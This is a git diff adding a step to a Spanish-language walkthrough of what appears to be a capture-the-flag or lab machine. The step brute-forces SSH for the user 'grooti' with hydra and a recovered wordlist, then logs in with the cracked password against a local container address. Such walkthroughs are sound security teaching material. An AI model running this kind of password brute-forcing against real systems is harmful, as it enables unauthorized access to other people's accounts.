@@ -71,4 +71,11 @@ y vemos que la contraseña es ```password1```
 
 Una vez descomprimido, nos dará ```password16.txt``` el cual parece ser una wordlist
 
+## Paso N6: Accediendo a usuario Grooti
+Aplicaremos fuerza bruta al usuario grooti con la wordlist obtenida anteriormente ```password16.txt```
+```
+hydra -l grooti -P password16.txt ssh://172.17.0.2
+```
+<img width="670" height="385" alt="image" src="https://github.com/user-attachments/assets/ef41aebe-7fc0-48c0-9617-7edfa23ed0c8" />
 
+Vemos que la contraseña para el usuario ```grooti``` es ```YoSoYgRoOt```, por lo que ahora con la credenciales obtenidas podemos entrar al servidor ssh ```ssh grooti@172.17.0.2```
